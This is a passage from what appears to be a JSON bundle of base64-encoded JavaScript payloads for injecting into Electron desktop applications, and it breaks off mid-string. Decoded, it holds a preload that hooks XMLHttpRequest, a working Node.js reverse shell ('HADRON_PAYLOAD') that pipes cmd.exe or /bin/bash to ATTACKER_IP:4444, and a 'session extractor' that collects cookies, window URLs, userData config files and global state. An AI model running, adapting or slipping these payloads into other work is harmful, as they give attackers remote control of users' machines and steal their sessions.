CByZXR1cm4gb3JpZ2luYWxYSFJPcGVuLmNhbGwodGhpcywgbWV0aG9kLCB1cmwsIC4uLmFyZ3MpOwogICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICBYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUuc2VuZCA9IGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICBpZiAodGhpcy5fb3JpZ2luYWxVcmwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtQUk9YWV0gU2VuZGluZyBYSFI6ICR7dGhpcy5fb3JpZ2luYWxVcmx9YCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBvcmlnaW5hbFhIUlNlbmQuY2FsbCh0aGlzLCBkYXRhKTsKICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tQUk9YWV0gUmVuZGVyZXIgaG9va3MgaW5zdGFsbGVkJyk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKCiAgICAgICAgLy8gSW5zdGFsbCBob29rcyBpbW1lZGlhdGVseQogICAgICAgIGlmICh3aW5kb3cuX19QUk9YWV9IT09LX18pIHsKICAgICAgICAgICAgd2luZG93Ll9fUFJPWFlfSE9PS19fLmluc3RhbGwoKTsKICAgICAgICB9CiAgICB9IGNhdGNoKGVycikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tQUk9YWV0gUHJlbG9hZCBlcnJvcjonLCBlcnIubWVzc2FnZSk7CiAgICB9Cn0pKCk7IA==","simple-reverse-shell.js":"Ly8gSEFEUk9OX1BBWUxPQUQKLy8gU2ltcGxlIFJldmVyc2UgU2hlbGwgLSBObyBibG9jayBjb21tZW50cwovLyBDb25maWd1cmF0aW9uOiBDaGFuZ2UgQVRUQUNLRVJfSVAgYW5kIEFUVEFDS0VSX1BPUlQgYmVsb3cKCi8qIFBBWUxPQURfU1RBUlQgKi8KLy8gUmV2ZXJzZSBTaGVsbCBDb25maWd1cmF0aW9uCnZhciBBVFRBQ0tFUl9JUCA9ICcxMjcuMC4wLjEnOwp2YXIgQVRUQUNLRVJfUE9SVCA9IDQ0NDQ7CgovLyBTaW1wbGUgcmV2ZXJzZSBzaGVsbAooZnVuY3Rpb24oKSB7CiAgdHJ5IHsKICAgIHZhciBuZXQgPSByZXF1aXJlKCduZXQnKTsKICAgIHZhciBzcGF3biA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5zcGF3bjsKICAgIHZhciBvcyA9IHJlcXVpcmUoJ29zJyk7CiAgICAKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgCiAgICBjbGllbnQuY29ubmVjdChBVFRBQ0tFUl9QT1JULCBBVFRBQ0tFUl9JUCwgZnVuY3Rpb24oKSB7CiAgICAgIHZhciBzaGVsbCA9IG9zLnBsYXRmb3JtKCkgPT09ICd3aW4zMicgPyAnY21kLmV4ZScgOiAnL2Jpbi9iYXNoJzsKICAgICAgdmFyIGNoaWxkID0gc3Bhd24oc2hlbGwsIFtdLCB7IHN0ZGlvOiBbJ3BpcGUnLCAncGlwZScsICdwaXBlJ10gfSk7CiAgICAgIAogICAgICBjbGllbnQucGlwZShjaGlsZC5zdGRpbik7CiAgICAgIGNoaWxkLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICAgIGNoaWxkLnN0ZGVyci5waXBlKGNsaWVudCk7CiAgICAgIAogICAgICBjbGllbnQub24oJ2Nsb3NlJywgZnVuY3Rpb24oKSB7IGNoaWxkLmtpbGwoKTsgfSk7CiAgICAgIGNoaWxkLm9uKCdleGl0JywgZnVuY3Rpb24oKSB7IGNsaWVudC5lbmQoKTsgfSk7CiAgICB9KTsKICAgIAogICAgY2xpZW50Lm9uKCdlcnJvcicsIGZ1bmN0aW9uKGVycikgewogICAgICBjb25zb2xlLmxvZygnU2hlbGwgZXJyb3I6JywgZXJyLm1lc3NhZ2UpOwogICAgfSk7CiAgICAKICB9IGNhdGNoIChlKSB7CiAgICBjb25zb2xlLmxvZygnUGF5bG9hZCBlcnJvcjonLCBlLm1lc3NhZ2UpOwogIH0KfSkoKTsKLyogUEFZTE9BRF9FTkQgKi8=","storage-hook.js":"Y29uc29sZS5sb2coJ1tNQUlOLVNFU1NJT05dID09PSBTVEFSVElORyBNQUlOIFBST0NFU1MgU0VTU0lPTiBFWFRSQUNUT1IgPT09Jyk7CgooZnVuY3Rpb24oKSB7CiAgICAndXNlIHN0cmljdCc7CiAgICAKICAgIC8vIE9ubHkgcnVuIGluIG1haW4gcHJvY2VzcwogICAgaWYgKHR5cGVvZiB3aW5kb3cgIT09ICd1bmRlZmluZWQnKSB7CiAgICAgICAgY29uc29sZS5sb2coJ1tNQUlOLVNFU1NJT05dIERldGVjdGVkIHJlbmRlcmVyIGNvbnRleHQsIHNraXBwaW5nIG1haW4gcHJvY2VzcyBwYXlsb2FkJyk7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgCiAgICAvLyBTa2lwIGlmIGFscmVhZHkgbG9hZGVkCiAgICBpZiAoZ2xvYmFsLl9tYWluU2Vzc2lvbkxvYWRlZCkgewogICAgICAgIGNvbnNvbGUubG9nKCdbTUFJTi1TRVNTSU9OXSBBbHJlYWR5IGxvYWRlZCwgc2tpcHBpbmcuLi4nKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBnbG9iYWwuX21haW5TZXNzaW9uTG9hZGVkID0gdHJ1ZTsKICAgIAogICAgY29uc3QgUE9SVCA9IDEwMDExOwogICAgbGV0IHNlcnZlciA9IG51bGw7CiAgICBsZXQgc2Vzc2lvbkRhdGEgPSB7fTsKICAgIAogICAgY29uc29sZS5sb2coJ1tNQUlOLVNFU1NJT05dIEluaXRpYWxpemluZyBtYWluIHByb2Nlc3Mgc2Vzc2lvbiBleHRyYWN0b3IuLi4nKTsKICAgIAogICAgLy8gU2FmZSBKU09OIHNlcmlhbGl6YXRpb24KICAgIGZ1bmN0aW9uIHNhZmVTdHJpbmdpZnkob2JqKSB7CiAgICAgICAgY29uc3Qgc2VlbiA9IG5ldyBXZWFrU2V0KCk7CiAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KG9iaiwgKGtleSwgdmFsdWUpID0+IHsKICAgICAgICAgICAgaWYgKHR5cGVvZiB2YWx1ZSA9PT0gJ29iamVjdCcgJiYgdmFsdWUgIT09IG51bGwpIHsKICAgICAgICAgICAgICAgIGlmIChzZWVuLmhhcyh2YWx1ZSkpIHJldHVybiAnW0NpcmN1bGFyIFJlZmVyZW5jZV0nOwogICAgICAgICAgICAgICAgc2Vlbi5hZGQodmFsdWUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICh0eXBlb2YgdmFsdWUgPT09ICdmdW5jdGlvbicpIHJldHVybiBgW0Z1bmN0aW9uOiAke3ZhbHVlLm5hbWUgfHwgJ2Fub255bW91cyd9XWA7CiAgICAgICAgICAgIGlmICh2YWx1ZSBpbnN0YW5jZW9mIERhdGUpIHJldHVybiB2YWx1ZS50b0lTT1N0cmluZygpOwogICAgICAgICAgICBpZiAodmFsdWUgaW5zdGFuY2VvZiBFcnJvcikgcmV0dXJuIHsgZXJyb3I6IHZhbHVlLm1lc3NhZ2UsIHN0YWNrOiB2YWx1ZS5zdGFjayB9OwogICAgICAgICAgICBpZiAodmFsdWUgaW5zdGFuY2VvZiBSZWdFeHApIHJldHVybiB2YWx1ZS50b1N0cmluZygpOwogICAgICAgICAgICByZXR1cm4gdmFsdWU7CiAgICAgICAgfSk7CiAgICB9CiAgICAKICAgIC8vIFNhZmUgY2xvbmUgd2l0aCBjaXJjdWxhciByZWZlcmVuY2UgaGFuZGxpbmcKICAgIGZ1bmN0aW9uIHNhZmVDbG9uZShvYmosIGRlcHRoID0gMCwgbWF4RGVwdGggPSA1LCBzZWVuID0gbmV3IFdlYWtNYXAoKSkgewogICAgICAgIGlmIChkZXB0aCA+IG1heERlcHRoKSByZXR1cm4gJ1tNYXggRGVwdGggUmVhY2hlZF0nOwogICAgICAgIGlmIChvYmogPT09IG51bGwgfHwgdHlwZW9mIG9iaiAhPT0gJ29iamVjdCcpIHJldHVybiBvYmo7CiAgICAgICAgaWYgKHNlZW4uaGFzKG9iaikpIHJldHVybiAnW0NpcmN1bGFyIFJlZmVyZW5jZV0nOwogICAgICAgIAogICAgICAgIHNlZW4uc2V0KG9iaiwgdHJ1ZSk7CiAgICAgICAgCiAgICAgICAgaWYgKG9iaiBpbnN0YW5jZW9mIERhdGUpIHJldHVybiBvYmoudG9JU09TdHJpbmcoKTsKICAgICAgICBpZiAob2JqIGluc3RhbmNlb2YgRXJyb3IpIHJldHVybiB7IGVycm9yOiBvYmoubWVzc2FnZSB9OwogICAgICAgIGlmICh0eXBlb2Ygb2JqID09PSAnZnVuY3Rpb24nKSByZXR1cm4gYFtGdW5jdGlvbjogJHtvYmoubmFtZSB8fCAnYW5vbnltb3VzJ31dYDsKICAgICAgICAKICAgICAgICBpZiAoQXJyYXkuaXNBcnJheShvYmopKSB7CiAgICAgICAgICAgIHJldHVybiBvYmouc2xpY2UoMCwgMjApLm1hcChpdGVtID0+IHNhZmVDbG9uZShpdGVtLCBkZXB0aCArIDEsIG1heERlcHRoLCBzZWVuKSk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIGNvbnN0IGNsb25lZCA9IHt9OwogICAgICAgIGxldCBjb3VudCA9IDA7CiAgICAgICAgZm9yIChjb25zdCBba2V5LCB2YWx1ZV0gb2YgT2JqZWN0LmVudHJpZXMob2JqKSkgewogICAgICAgICAgICBpZiAoY291bnQrKyA+IDUwKSBicmVhazsgLy8gTGltaXQgb2JqZWN0IHNpemUKICAgICAgICAgICAgY2xvbmVkW2tleV0gPSBzYWZlQ2xvbmUodmFsdWUsIGRlcHRoICsgMSwgbWF4RGVwdGgsIHNlZW4pOwogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gY2xvbmVkOwogICAgfQogICAgCiAgICAvLyBDb2xsZWN0IEVsZWN0cm9uIGFwcCBpbmZvcm1hdGlvbgogICAgZnVuY3Rpb24gY29sbGVjdEVsZWN0cm9uRGF0YSgpIHsKICAgICAgICBjb25zdCBlbGVjdHJvbkRhdGEgPSB7fTsKICAgICAgICAKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zdCB7IGFwcCwgQnJvd3NlcldpbmRvdywgd2ViQ29udGVudHMsIHNlc3Npb24gfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBBcHAgaW5mb3JtYXRpb24KICAgICAgICAgICAgaWYgKGFwcC5pc1JlYWR5KCkpIHsKICAgICAgICAgICAgICAgIGVsZWN0cm9uRGF0YS5hcHAgPSB7CiAgICAgICAgICAgICAgICAgICAgbmFtZTogYXBwLmdldE5hbWUoKSwKICAgICAgICAgICAgICAgICAgICB2ZXJzaW9uOiBhcHAuZ2V0VmVyc2lvbigpLAogICAgICAgICAgICAgICAgICAgIHVzZXJEYXRhOiBhcHAuZ2V0UGF0aCgndXNlckRhdGEnKSwKICAgICAgICAgICAgICAgICAgICBhcHBQYXRoOiBhcHAuZ2V0QXBwUGF0aCgpLAogICAgICAgICAgICAgICAgICAgIGxvY2FsZTogYXBwLmdldExvY2FsZSgpLAogICAgICAgICAgICAgICAgICAgIGlzUGFja2FnZWQ6IGFwcC5pc1BhY2thZ2VkLAogICAgICAgICAgICAgICAgICAgIGNvbW1hbmRMaW5lOiBwcm9jZXNzLmFyZ3YKICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEdldCBhbGwgd2luZG93cyBhbmQgdGhlaXIgaW5mbwogICAgICAgICAgICAgICAgZWxlY3Ryb25EYXRhLndpbmRvd3MgPSBbXTsKICAgICAgICAgICAgICAgIEJyb3dzZXJXaW5kb3cuZ2V0QWxsV2luZG93cygpLmZvckVhY2goKHdpbmRvdywgaW5kZXgpID0+IHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBlbGVjdHJvbkRhdGEud2luZG93cy5wdXNoKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkOiB3aW5kb3cuaWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogd2luZG93LmdldFRpdGxlKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IHdpbmRvdy53ZWJDb250ZW50cy5nZXRVUkwoKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzVmlzaWJsZTogd2luZG93LmlzVmlzaWJsZSgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYm91bmRzOiB3aW5kb3cuZ2V0Qm91bmRzKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpc0RldlRvb2xzT3BlbmVkOiB3aW5kb3cud2ViQ29udGVudHMuaXNEZXZUb29sc09wZW5lZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgICAgICAgICBlbGVjdHJvbkRhdGEud2luZG93cy5wdXNoKHsgaWQ6IGluZGV4LCBlcnJvcjogZXJyLm1lc3NhZ2UgfSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEdldCBhbGwgd2ViIGNvbnRlbnRzCiAgICAgICAgICAgICAgICBlbGVjdHJvbkRhdGEud2ViQ29udGVudHMgPSBbXTsKICAgICAgICAgICAgICAgIHdlYkNvbnRlbnRzLmdldEFsbFdlYkNvbnRlbnRzKCkuZm9yRWFjaCgoY29udGVudHMsIGluZGV4KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgZWxlY3Ryb25EYXRhLndlYkNvbnRlbnRzLnB1c2goewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IGNvbnRlbnRzLmlkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogY29udGVudHMuZ2V0VHlwZSgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBjb250ZW50cy5nZXRVUkwoKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBjb250ZW50cy5nZXRUaXRsZSgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlckFnZW50OiBjb250ZW50cy5nZXRVc2VyQWdlbnQoKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHpvb21MZXZlbDogY29udGVudHMuZ2V0Wm9vbUxldmVsKCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYW5Hb0JhY2s6IGNvbnRlbnRzLmNhbkdvQmFjaygpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FuR29Gb3J3YXJkOiBjb250ZW50cy5jYW5Hb0ZvcndhcmQoKQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZWxlY3Ryb25EYXRhLndlYkNvbnRlbnRzLnB1c2goeyBpZDogaW5kZXgsIGVycm9yOiBlcnIubWVzc2FnZSB9KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gR2V0IGRlZmF1bHQgc2Vzc2lvbiBpbmZvCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGRlZmF1bHRTZXNzaW9uID0gc2Vzc2lvbi5kZWZhdWx0U2Vzc2lvbjsKICAgICAgICAgICAgICAgICAgICBlbGVjdHJvbkRhdGEuc2Vzc2lvbiA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgaXNQZXJzaXN0ZW50OiBkZWZhdWx0U2Vzc2lvbi5pc1BlcnNpc3RlbnQoKSwKICAgICAgICAgICAgICAgICAgICAgICAgdXNlckFnZW50OiBkZWZhdWx0U2Vzc2lvbi5nZXRVc2VyQWdlbnQoKSwKICAgICAgICAgICAgICAgICAgICAgICAgcHJlbG9hZHM6IGRlZmF1bHRTZXNzaW9uLmdldFByZWxvYWRzKCksCiAgICAgICAgICAgICAgICAgICAgICAgIHNwZWxsQ2hlY2tlckxhbmd1YWdlczogZGVmYXVsdFNlc3Npb24uZ2V0U3BlbGxDaGVja2VyTGFuZ3VhZ2VzKCkKICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC8vIFRyeSB0byBnZXQgY29va2llcyAobGltaXRlZCBieSBzYW1lLW9yaWdpbiBwb2xpY3kpCiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdFNlc3Npb24uY29va2llcy5nZXQoe30pLnRoZW4oY29va2llcyA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb25EYXRhLmNvb2tpZXMgPSBjb29raWVzOwogICAgICAgICAgICAgICAgICAgIH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgICAgIGVsZWN0cm9uRGF0YS5zZXNzaW9uID0geyBlcnJvcjogZXJyLm1lc3NhZ2UgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGVsZWN0cm9uRGF0YS5hcHAgPSB7IHN0YXR1czogJ25vdCByZWFkeScgfTsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbTUFJTi1TRVNTSU9OXSBFcnJvciBjb2xsZWN0aW5nIEVsZWN0cm9uIGRhdGE6JywgZXJyKTsKICAgICAgICAgICAgZWxlY3Ryb25EYXRhLmVycm9yID0gZXJyLm1lc3NhZ2U7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBlbGVjdHJvbkRhdGE7CiAgICB9CiAgICAKICAgIC8vIENvbGxlY3QgY29uZmlndXJhdGlvbiBmaWxlcyBhbmQgdXNlciBkYXRhCiAgICBmdW5jdGlvbiBjb2xsZWN0Q29uZmlnRGF0YSgpIHsKICAgICAgICBjb25zdCBjb25maWdEYXRhID0gewogICAgICAgICAgICBmaWxlczoge30sCiAgICAgICAgICAgIGRpcmVjdG9yaWVzOiB7fQogICAgICAgIH07CiAgICAgICAgCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgY29uc3QgeyBhcHAgfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgICAgIGNvbnN0IGZzID0gcmVxdWlyZSgnZnMnKTsKICAgICAgICAgICAgY29uc3QgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICghYXBwLmlzUmVhZHkoKSkgcmV0dXJuIGNvbmZpZ0RhdGE7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCB1c2VyRGF0YVBhdGggPSBhcHAuZ2V0UGF0aCgndXNlckRhdGEnKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIENvbW1vbiBjb25maWcgZmlsZXMgdG8gY2hlY2sKICAgICAgICAgICAgY29uc3QgY29uZmlnRmlsZXMgPSBbCiAgICAgICAgICAgICAgICAnY29uZmlnLmpzb24nLAogICAgICAgICAgICAgICAgJ3NldHRpbmdzLmpzb24nLAogICAgICAgICAgICAgICAgJ3N0YXRlLmpzb24nLAogICAgICAgICAgICAgICAgJ3ByZWZlcmVuY2VzLmpzb24nLAogICAgICAgICAgICAgICAgJ3VzZXItcHJlZmVyZW5jZXMuanNvbicsCiAgICAgICAgICAgICAgICAnd2luZG93LXN0YXRlLmpzb24nLAogICAgICAgICAgICAgICAgJ2FwcC1zdGF0ZS5qc29uJywKICAgICAgICAgICAgICAgICdQcmVmZXJlbmNlcycsCiAgICAgICAgICAgICAgICAnTG9jYWwgU3RhdGUnCiAgICAgICAgICAgIF07CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25maWdGaWxlcy5mb3JFYWNoKGZpbGVuYW1lID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IGZpbGVQYXRoID0gcGF0aC5qb2luKHVzZXJEYXRhUGF0aCwgZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBpZiAoZnMuZXhpc3RzU3luYyhmaWxlUGF0aCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhdHMgPSBmcy5zdGF0U3luYyhmaWxlUGF0aCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpZ0RhdGEuZmlsZXNbZmlsZW5hbWVdID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aDogZmlsZVBhdGgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaXplOiBzdGF0cy5zaXplLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbW9kaWZpZWQ6IHN0YXRzLm10aW1lLnRvSVNPU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIFRyeSB0byByZWFkIGFuZCBwYXJzZSBpZiBpdCdzIGEgcmVhc29uYWJsZSBzaXplCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGF0cy5zaXplIDwgMTAyNCAqIDEwMjQpIHsgLy8gPCAxTUIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgY29udGVudCA9IGZzLnJlYWRGaWxlU3luYyhmaWxlUGF0aCwgJ3V0ZjgnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBUcnkgdG8gcGFyc2UgYXMgSlNPTgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmaWxlbmFtZS5lbmRzV2l0aCgnLmpzb24nKSB8fCBmaWxlbmFtZSA9PT0gJ1ByZWZlcmVuY2VzJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maWdEYXRhLmZpbGVzW2ZpbGVuYW1lXS5jb250ZW50ID0gSlNPTi5wYXJzZShjb250ZW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maWdEYXRhLmZpbGVzW2ZpbGVuYW1lXS5jb250ZW50ID0gY29udGVudDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maWdEYXRhLmZpbGVzW2ZpbGVuYW1lXS5yZWFkRXJyb3IgPSBlcnIubWVzc2FnZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgICAgIGNvbmZpZ0RhdGEuZmlsZXNbZmlsZW5hbWVdID0geyBlcnJvcjogZXJyLm1lc3NhZ2UgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBTY2FuIHVzZXJEYXRhIGRpcmVjdG9yeSBmb3IgaW50ZXJlc3RpbmcgZmlsZXMKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IGl0ZW1zID0gZnMucmVhZGRpclN5bmModXNlckRhdGFQYXRoKTsKICAgICAgICAgICAgICAgIGNvbmZpZ0RhdGEuZGlyZWN0b3JpZXMudXNlckRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgcGF0aDogdXNlckRhdGFQYXRoLAogICAgICAgICAgICAgICAgICAgIGl0ZW1zOiBpdGVtcy5zbGljZSgwLCAyMCkgLy8gTGltaXQgdG8gZmlyc3QgMjAgaXRlbXMKICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgY29uZmlnRGF0YS5kaXJlY3Rvcmllcy51c2VyRGF0YSA9IHsgZXJyb3I6IGVyci5tZXNzYWdlIH07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tNQUlOLVNFU1NJT05dIEVycm9yIGNvbGxlY3RpbmcgY29uZmlnIGRhdGE6JywgZXJyKTsKICAgICAgICAgICAgY29uZmlnRGF0YS5lcnJvciA9IGVyci5tZXNzYWdlOwogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gY29uZmlnRGF0YTsKICAgIH0KICAgIAogICAgLy8gQ29sbGVjdCBnbG9iYWwgdmFyaWFibGVzIGFuZCBhcHBsaWNhdGlvbiBzdGF0ZQogICAgZnVuY3Rpb24gY29sbGVjdEdsb2JhbERhdGEoKSB7CiAgICAgICAgY29uc3QgZ2xvYmFsRGF0YSA9IHsKICAgICAgICAgICAgdmFyaWFibGVzOiB7fSwKICAgICAgICAgICAgbW9kdWxlczoge30sCiAgICAgICAgICAgIHByb2Nlc3M6IHt9CiAgICAgICAgfTsKICAgICAgICAKICAgICAgICB0cnkgewogICAgICAgICAgICAvLyBQcm9jZXNzIGluZm9ybWF0aW9uCiAgICAgICAgICAgIGdsb2JhbERhdGEucHJvY2VzcyA9IHsKICAgICAgICAgICAgICAgIGFyZ3Y6IHByb2Nlc3MuYXJndiwKICAgICAgICAgICAgICAgIGVudjogewogICAgICAgICAgICAgICAgICAgIE5PREVfRU5WOiBwcm9jZXNzLmVudi5OT0RFX0VOViwKICAgICAgICAgICAgICAgICAgICBFTEVDVFJPTl9JU19ERVY6IHByb2Nlc3MuZW52LkVMRUNUUk9OX0lTX0RFViwKICAgICAgICAgICAgICAgICAgICBucG1fcGFja2FnZV9uYW1lOiBwcm9jZXNzLmVudi5ucG1fcGFja2FnZV9uYW1lLAogICAgICAgICAgICAgICAgICAgIG5wbV9wYWNrYWdlX3ZlcnNpb246IHByb2Nlc3MuZW52Lm5wbV9wYWNrYWdlX3ZlcnNpb24KICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB2ZXJzaW9uczogcHJvY2Vzcy52ZXJzaW9ucywKICAgICAgICAgICAgICAgIHBsYXRmb3JtOiBwcm9jZXNzLnBsYXRmb3JtLAogICAgICAgICAgICAgICAgYXJjaDogcHJvY2Vzcy5hcmNoLAogICAgICAgICAgICAgICAgcGlkOiBwcm9jZXNzLnBpZCwKICAgICAgICAgICAgICAgIHRpdGxlOiBwcm9jZXNzLnRpdGxlCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBTY2FuIGdsb2JhbCB2YXJpYWJsZXMgZm9yIGludGVyZXN0aW5nIGRhdGEKICAgICAgICAgICAgY29uc3Qgc2tpcEtleXMgPSBbCiAgICAgICAgICAgICAgICAncHJvY2VzcycsICdnbG9iYWwnLCAnY29uc29sZScsICdCdWZmZXInLCAncmVxdWlyZScsICdtb2R1bGUnLCAnZXhwb3J0cycsCiAgICAgICAgICAgICAgICAnX19kaXJuYW1lJywgJ19fZmlsZW5hbWUnLCAnY2xlYXJJbW1lZGlhdGUnLCAnY2xlYXJJbnRlcnZhbCcsICdjbGVhclRpbWVvdXQnLAogICAgICAgICAgICAgICAgJ3NldEltbWVkaWF0ZScsICdzZXRJbnRlcnZhbCcsICdzZXRUaW1lb3V0JywgJ19tYWluU2Vzc2lvbkxvYWRlZCcKICAgICAgICAgICAgXTsKICAgICAgICAgICAgCiAgICAgICAgICAgIE9iamVjdC5rZXlzKGdsb2JhbCkuZm9yRWFjaChrZXkgPT4gewogICAgICAgICAgICAgICAgaWYgKCFza2lwS2V5cy5pbmNsdWRlcyhrZXkpICYmICFrZXkuc3RhcnRzV2l0aCgnXycpKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdmFsdWUgPSBnbG9iYWxba2V5XTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHZhbHVlICE9PSBudWxsICYmIHZhbHVlICE9PSB1bmRlZmluZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbERhdGEudmFyaWFibGVzW2tleV0gPSBzYWZlQ2xvbmUodmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbERhdGEudmFyaWFibGVzW2tleV0gPSBgW0Vycm9yOiAke2Vyci5tZXNzYWdlfV1gOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICBjb2